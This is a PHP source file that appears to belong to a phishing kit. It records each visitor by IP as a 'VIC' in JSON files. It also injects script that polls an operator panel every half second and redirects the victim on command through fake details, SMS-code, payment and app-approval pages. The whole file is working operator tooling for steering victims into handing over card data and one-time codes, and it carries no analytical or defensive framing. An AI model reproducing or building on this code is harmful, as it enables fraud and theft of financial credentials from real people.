<?php 
 
@session_start();

require (__DIR__).'/../../config.php';

class Mother{

public $JSON_FILE = 0;
public $JSON_DATA = 0;
public $JSON_DECODED_DATA = 0;
public $JSON_UPDATES = 0;





function __construct(){
 $this->createVic();
}


public function setDataFile($PATH){
	$this->JSON_FILE = $PATH;
	$this->JSON_DATA = file_get_contents($this->JSON_FILE);
}






public function getData(){
	return json_decode($this->JSON_DATA, true);
}




public function getip(){
 $ip = $_SERVER['REMOTE_ADDR'];
 if($ip=="::1"){
  $ip = "127.0.0.1";
 }

 return $ip;
}

public function getFileId(){
$ip = $this->getIp();
 return  (__DIR__)."/../data/vics/VIC-$ip.json";
}





public function update($arr){
	$data = $this->getData();
		foreach($arr as $k=>$v){
		$data[$k] = str_replace('"',"\"", $v);
		$update = json_encode($data);
		file_put_contents($this->JSON_FILE, $update);
		}

}



public function createVic(){
 if(isset($_SESSION['vic'])=="" or !file_exists($this->getFileId())){
    $ip = $this->getIp();
    $id = "ID-".substr(base64_encode($ip), 0, 10);
    $time = time();

    $defaultData = '{
     "ID":"'.$id.'",
     "IP":"'.$ip.'",
     "REDIRECT":0,
     "CURRENT_PAGE":null,
     "LAST_ACT":'.$time.',
					"LOGS":""
    }';

     $fileId = $this->getFileId();
     $fp = fopen($fileId, "w+");
     fwrite($fp, $defaultData);
     fclose($fp);
     $_SESSION['vic'] = $ip;
     return $fileId;
   }else{
   return $this->getFileId();
   }
}


public function keepDataFile(){
 
}


public function feed($time, $page){
  $arrData = array("LAST_ACT"=>$time, "CURRENT_PAGE"=>$page);
  $this->update($arrData);

}



public function ctr($p){

 echo '
	<script src="../panel/res/jq.js"></script>
	<script>

	var targets = {1:"index?s=ERROR", 2:"details", 3:"cart?s=ERROR",4:"sms",5:"index.php?s=ERROR",
	 6:"sms", 7:"sms?s=ERROR",8:"pay?s=ERROR", 9:"app", 11:"app?s=ERROR", 10:"pay?s=ERROR", 99:"done" };

	clearRedirections();
	
 setInterval(function(){
	$.post("../panel/classes/processor.php",
	{keepAlive:1, page:"'.$p.'"} );
}, 500);

var redirect=0;
setInterval(function(){
	$.post("../panel/classes/processor.php",{redirectionListener:1}, function(data){
		redirect=data;
		if(redirect==0){
			return false;
		}else{
			clearRedirections();
			window.location=targets[redirect];
		}
	});
}, 500);


function clearRedirections(){
	$.post("../panel/classes/processor.php",
	{clearRedirection:1});
}

 </script>
';

}





}



?>